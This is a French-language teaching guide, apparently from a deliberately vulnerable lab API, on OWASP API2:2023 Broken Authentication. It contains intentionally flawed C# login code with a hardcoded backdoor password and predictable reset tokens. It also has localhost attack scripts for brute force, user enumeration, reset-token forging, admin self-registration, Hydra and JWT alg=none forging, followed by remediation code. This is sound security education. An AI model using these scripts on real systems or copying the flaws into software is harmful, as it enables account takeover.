# API2:2023 - Broken Authentication

## 📋 Description de la vulnérabilité

La vulnérabilité **Broken Authentication** se produit lorsque les mécanismes d'authentification sont mal implémentés, permettant aux attaquants de compromettre des tokens d'authentification, des clés API ou d'exploiter des failles d'implémentation pour usurper l'identité d'autres utilisateurs.

### Impact potentiel
- Prise de contrôle de comptes utilisateurs
- Vol d'identité et usurpation
- Accès non autorisé aux données et fonctionnalités
- Création de comptes privilégiés non autorisés
- Compromission de la confidentialité et de l'intégrité des données

## 🎯 Endpoints vulnérables

Le contrôleur `Api02AuthController` expose de nombreux endpoints vulnérables :

### 1. **Endpoints de connexion**
- `POST /api/auth/login` - Connexion sans limitation de tentatives
- `POST /api/auth/login-basic` - Authentification basique HTTP (credentials en clair)
- `POST /api/auth/login-simple` - Token prédictible basé sur l'email

### 2. **Gestion des mots de passe**
- `POST /api/auth/register` - Enregistrement sans politique de mot de passe
- `POST /api/auth/register-bulk` - Enregistrement en masse sans limitation
- `POST /api/auth/forgot-password` - Token de réinitialisation prédictible
- `POST /api/auth/reset-password` - Réinitialisation sans vérification
- `POST /api/auth/change-password-insecure` - Changement sans authentification

### 3. **Gestion des sessions**
- `POST /api/auth/logout` - Logout inefficace (token reste valide)
- `POST /api/auth/refresh-token` - Refresh sans validation
- `GET /api/auth/validate-session` - Token exposé dans l'URL

### 4. **OAuth/SSO**
- `GET /api/auth/oauth/authorize` - State parameter prédictible
- `POST /api/auth/oauth/callback` - Callback sans validation

### 5. **Clés API**
- `POST /api/auth/generate-api-key` - Génération sans authentification
- `GET /api/auth/validate-api-key` - Validation exposant des informations

### 6. **Backdoor administrateur**
- `POST /api/auth/admin-login` - Mot de passe maître codé en dur

## 🔍 Code vulnérable expliqué

### Exemple 1 : Connexion sans protection contre le brute force

```csharp
[HttpPost("login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // VULNÉRABLE: Pas de limite sur les tentatives de connexion
    // VULNÉRABLE: Messages d'erreur révélateurs
    
    var user = await _context.Set<AuthUser>()
        .FirstOrDefaultAsync(u => u.Email == request.Email);

    if (user == null)
    {
        // VULNÉRABLE: Confirme l'existence ou non de l'utilisateur
        return Unauthorized(new { error = "User not found with this email" });
    }

    // VULNÉRABLE: Comparaison de mot de passe en clair
    if (user.Password != request.Password)
    {
        return Unauthorized(new { error = "Invalid password for this user" });
    }

    // VULNÉRABLE: Token JWT avec secret faible
    var token = GenerateWeakJwtToken(user);
    
    return Ok(new
    {
        token,
        expiresIn = "30 days", // VULNÉRABLE: Token de longue durée
        userId = user.Id, // VULNÉRABLE: Exposition d'informations sensibles
        role = user.Role
    });
}
```

**Problèmes** :
- Pas de limitation du nombre de tentatives
- Messages d'erreur permettant l'énumération d'utilisateurs
- Mots de passe stockés en clair
- Token JWT avec durée de vie excessive

### Exemple 2 : Token de réinitialisation prédictible

```csharp
private string GeneratePredictableResetToken(string email)
{
    // VULNÉRABLE: Token prédictible basé sur l'email et le timestamp
    var timestamp = DateTime.UtcNow.ToString("yyyyMMddHHmm");
    var data = $"{email}:{timestamp}";
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
}
```

**Problème** : Un attaquant connaissant l'email peut générer des tokens valides.

### Exemple 3 : Backdoor administrateur

```csharp
[HttpPost("admin-login")]
public async Task<IActionResult> AdminLogin([FromBody] AdminLoginRequest request)
{
    // VULNÉRABLE: Mot de passe maître codé en dur
    if (request.MasterPassword == "SuperSecretBackdoor123!")
    {
        var adminUser = await _context.Set<AuthUser>()
            .FirstOrDefaultAsync(u => u.Role == "Admin");
            
        if (adminUser != null)
        {
            var token = GenerateWeakJwtToken(adminUser);
            return Ok(new { token, message = "Admin access granted" });
        }
    }
    
    // VULNÉRABLE: Compte admin par défaut
    if (request.Email == "admin@system.local" && request.Password == DefaultAdminPassword)
    {
        // Accès admin par défaut...
    }
}
```

### Exemple 4 : Génération de JWT faible

```csharp
private string GenerateWeakJwtToken(AuthUser user)
{
    // VULNÉRABLE: Secret codé en dur
    var key = Encoding.ASCII.GetBytes(HardcodedSecret);
    
    var tokenDescriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(new[]
        {
            new Claim("userId", user.Id.ToString()),
            new Claim("email", user.Email),
            new Claim("role", user.Role),
            // VULNÉRABLE: Informations sensibles dans le token
            new Claim("passwordChangedAt", user.PasswordChangedAt?.ToString() ?? "never")
        }),
        Expires = DateTime.UtcNow.AddDays(30), // VULNÉRABLE: Expiration trop longue
        SigningCredentials = new SigningCredentials(
            new SymmetricSecurityKey(key),
            SecurityAlgorithms.HmacSha256Signature),
        // VULNÉRABLE: Pas de validation d'issuer/audience
        Issuer = null,
        Audience = null
    };
}
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Attaque par force brute
```python
import requests
import itertools

# Génération de mots de passe courants
passwords = ['password', '123456', 'admin', 'password123', 'qwerty']
email = 'admin@example.com'

for password in passwords:
    response = requests.post('http://localhost:5000/api/auth/login', 
        json={'email': email, 'password': password})
    
    if response.status_code == 200:
        print(f"Mot de passe trouvé: {password}")
        print(f"Token: {response.json()['token']}")
        break
```

### Scénario 2 : Énumération d'utilisateurs
```bash
# Test d'existence d'emails
emails=("admin@example.com" "user@example.com" "test@example.com")

for email in "${emails[@]}"; do
    response=$(curl -s -X POST http://localhost:5000/api/auth/login \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"wrongpass\"}")
    
    if [[ $response == *"User not found"* ]]; then
        echo "Email n'existe pas: $email"
    else
        echo "Email existe: $email"
    fi
done
```

### Scénario 3 : Exploitation du token de réinitialisation
```python
import base64
from datetime import datetime

def generate_reset_token(email):
    # Génère des tokens pour les dernières minutes
    for minute in range(0, 5):
        timestamp = datetime.now().strftime(f"%Y%m%d%H{datetime.now().minute - minute:02d}")
        data = f"{email}:{timestamp}"
        token = base64.b64encode(data.encode()).decode()
        
        # Tente de réinitialiser le mot de passe
        response = requests.post('http://localhost:5000/api/auth/reset-password',
            json={'token': token, 'newPassword': 'hacked123'})
        
        if response.status_code == 200:
            print(f"Réinitialisation réussie avec token: {token}")
            break
```

### Scénario 4 : Création de compte administrateur
```bash
# Enregistrement en masse avec rôle privilégié
curl -X POST http://localhost:5000/api/auth/register-bulk \
    -H "Content-Type: application/json" \
    -d '[
        {"email": "hacker1@evil.com", "password": "pass123", "role": "Admin"},
        {"email": "hacker2@evil.com", "password": "pass123", "role": "SuperAdmin"}
    ]'
```

## 🛡️ Solutions de remédiation

### 1. **Implémenter une limitation des tentatives de connexion**

```csharp
private readonly IMemoryCache _cache;
private const int MaxLoginAttempts = 5;
private const int LockoutMinutes = 15;

[HttpPost("login")]
public async Task<IActionResult> SecureLogin([FromBody] LoginRequest request)
{
    // Vérifier le nombre de tentatives
    var attemptKey = $"login_attempts_{request.Email}";
    var attempts = _cache.Get<int>(attemptKey);
    
    if (attempts >= MaxLoginAttempts)
    {
        return StatusCode(429, new { error = "Too many login attempts. Please try again later." });
    }
    
    var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == request.Email);
    
    // Message d'erreur générique
    if (user == null || !BCrypt.Net.BCrypt.Verify(request.Password, user.PasswordHash))
    {
        _cache.Set(attemptKey, attempts + 1, TimeSpan.FromMinutes(LockoutMinutes));
        return Unauthorized(new { error = "Invalid credentials" });
    }
    
    // Réinitialiser les tentatives en cas de succès
    _cache.Remove(attemptKey);
    
    // Générer un token sécurisé
    var token = GenerateSecureToken(user);
    return Ok(new { token });
}
```

### 2. **Utiliser des mots de passe hachés**

```csharp
[HttpPost("register")]
public async Task<IActionResult> SecureRegister([FromBody] RegisterRequest request)
{
    // Valider la force du mot de passe
    if (!IsPasswordStrong(request.Password))
    {
        return BadRequest(new { error = "Password does not meet security requirements" });
    }
    
    // Vérifier l'unicité de l'email
    if (await _context.Users.AnyAsync(u => u.Email == request.Email))
    {
        // Message générique pour éviter l'énumération
        return BadRequest(new { error = "Registration failed" });
    }
    
    var user = new User
    {
        Email = request.Email,
        PasswordHash = BCrypt.Net.BCrypt.HashPassword(request.Password),
        Role = "User", // Jamais défini par l'utilisateur
        CreatedAt = DateTime.UtcNow,
        EmailVerified = false // Nécessite vérification
    };
    
    _context.Users.Add(user);
    await _context.SaveChangesAsync();
    
    // Envoyer email de vérification
    await _emailService.SendVerificationEmail(user.Email);
    
    return Ok(new { message = "Registration successful. Please verify your email." });
}

private bool IsPasswordStrong(string password)
{
    // Au moins 8 caractères, 1 majuscule, 1 minuscule, 1 chiffre, 1 caractère spécial
    var regex = new Regex(@"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$");
    return regex.IsMatch(password);
}
```

### 3. **Implémenter des tokens de réinitialisation sécurisés**

```csharp
[HttpPost("forgot-password")]
public async Task<IActionResult> SecureForgotPassword([FromBody] ForgotPasswordRequest request)
{
    // Toujours retourner le même message
    var response = new { message = "If the email exists, a reset link has been sent." };
    
    var user = await _context.Users.FirstOrDefaultAsync(u => u.Email == request.Email);
    if (user == null)
    {
        return Ok(response); // Ne pas révéler l'existence du compte
    }
    
    // Générer un token cryptographiquement sécurisé
    var resetToken = GenerateSecureResetToken();
    var hashedToken = BCrypt.Net.BCrypt.HashPassword(resetToken);
    
    // Stocker le token haché avec expiration
    user.ResetTokenHash = hashedToken;
    user.ResetTokenExpiry = DateTime.UtcNow.AddHours(1);
    await _context.SaveChangesAsync();
    
    // Envoyer par email (jamais dans la réponse API)
    await _emailService.SendPasswordResetEmail(user.Email, resetToken);
    
    return Ok(response);
}

private string GenerateSecureResetToken()
{
    var randomBytes = new byte[32];
    using (var rng = RandomNumberGenerator.Create())
    {
        rng.GetBytes(randomBytes);
    }
    return Convert.ToBase64String(randomBytes);
}
```

### 4. **Utiliser une configuration JWT sécurisée**

```csharp
private string GenerateSecureToken(User user)
{
    // Clé depuis la configuration (jamais codée en dur)
    var key = Encoding.UTF8.GetBytes(_configuration["Jwt:SecretKey"]);
    
    var tokenDescriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(new[]
        {
            new Claim(ClaimTypes.NameIdentifier, user.Id.ToString()),
            new Claim(ClaimTypes.Email, user.Email),
            new Claim(ClaimTypes.Role, user.Role),
            new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString())
        }),
        Expires = DateTime.UtcNow.AddHours(2), // Durée courte
        Issuer = _configuration["Jwt:Issuer"],
        Audience = _configuration["Jwt:Audience"],
        SigningCredentials = new SigningCredentials(
            new SymmetricSecurityKey(key),
            SecurityAlgorithms.HmacSha256Signature)
    };
    
    var tokenHandler = new JwtSecurityTokenHandler();
    var token = tokenHandler.CreateToken(tokenDescriptor);
    return tokenHandler.WriteToken(token);
}
```

### 5. **Implémenter une révocation de token efficace**

```csharp
[HttpPost("logout")]
[Authorize]
public async Task<IActionResult> SecureLogout()
{
    var jti = User.FindFirst(JwtRegisteredClaimNames.Jti)?.Value;
    if (string.IsNullOrEmpty(jti))
    {
        return BadRequest();
    }
    
    // Ajouter le token à une blacklist Redis
    await _redis.StringSetAsync(
        $"blacklist_{jti}",
        "revoked",
        TimeSpan.FromHours(2) // Même durée que le token
    );
    
    return Ok(new { message = "Logged out successfully" });
}

// Middleware pour vérifier la blacklist
public async Task<bool> IsTokenRevoked(string jti)
{
    return await _redis.KeyExistsAsync($"blacklist_{jti}");
}
```

### 6. **Ajouter l'authentification multi-facteurs (MFA)**

```csharp
[HttpPost("login/verify-2fa")]
[Authorize]
public async Task<IActionResult> Verify2FA([FromBody] Verify2FARequest request)
{
    var userId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;
    var user = await _context.Users.FindAsync(int.Parse(userId));
    
    if (user == null || string.IsNullOrEmpty(user.TotpSecret))
    {
        return BadRequest();
    }
    
    var totp = new Totp(Base32Encoding.ToBytes(user.TotpSecret));
    
    if (!totp.VerifyTotp(request.Code, out _))
    {
        return Unauthorized(new { error = "Invalid 2FA code" });
    }
    
    // Générer un nouveau token avec claim 2FA validé
    var claims = new List<Claim>(User.Claims)
    {
        new Claim("2fa_validated", "true")
    };
    
    var token = GenerateSecureTokenWithClaims(user, claims);
    return Ok(new { token });
}
```

## 🔧 Bonnes pratiques

1. **Hachage sécurisé** : Utiliser bcrypt, scrypt ou Argon2 pour les mots de passe
2. **Politique de mots de passe** : Imposer des mots de passe forts
3. **Limitation de taux** : Implémenter un rate limiting sur les endpoints sensibles
4. **Messages génériques** : Ne jamais révéler si un compte existe ou non
5. **Tokens sécurisés** : Utiliser des tokens cryptographiquement forts
6. **HTTPS obligatoire** : Forcer l'utilisation de HTTPS
7. **Rotation des secrets** : Changer régulièrement les clés de signature
8. **Journalisation** : Enregistrer toutes les tentatives d'authentification
9. **MFA** : Implémenter l'authentification multi-facteurs
10. **Sessions courtes** : Utiliser des durées de session appropriées

## 📊 Tests de détection

### Test de force brute avec Hydra
```bash
hydra -l admin@example.com -P /usr/share/wordlists/rockyou.txt \
    http-post-form://localhost:5000/api/auth/login:\
    "email=^USER^&password=^PASS^":"Invalid"
```

### Script de test d'énumération
```python
import requests
import json

def test_user_enumeration(base_url):
    test_emails = [
        "admin@example.com",
        "test@example.com", 
        "nonexistent@example.com"
    ]
    
    for email in test_emails:
        response = requests.post(f"{base_url}/api/auth/login",
            json={"email": email, "password": "wrongpassword"})
        
        print(f"Email: {email}")
        print(f"Response: {response.json()}")
        print("---")
```

### Test de validation JWT
```python
import jwt

def test_jwt_vulnerabilities(token):
    # Tenter de décoder sans vérification
    try:
        decoded = jwt.decode(token, options={"verify_signature": False})
        print("Token décodé sans vérification:")
        print(json.dumps(decoded, indent=2))
    except:
        print("Impossible de décoder le token")
    
    # Tester avec algorithme 'none'
    try:
        header = {"alg": "none", "typ": "JWT"}
        payload = jwt.decode(token, options={"verify_signature": False})
        none_token = jwt.encode(payload, "", algorithm="none")
        print(f"Token avec alg=none: {none_token}")
    except:
        pass
```

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités d'authentification.

## 📚 Références

- [OWASP API Security Top 10 2023 - Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)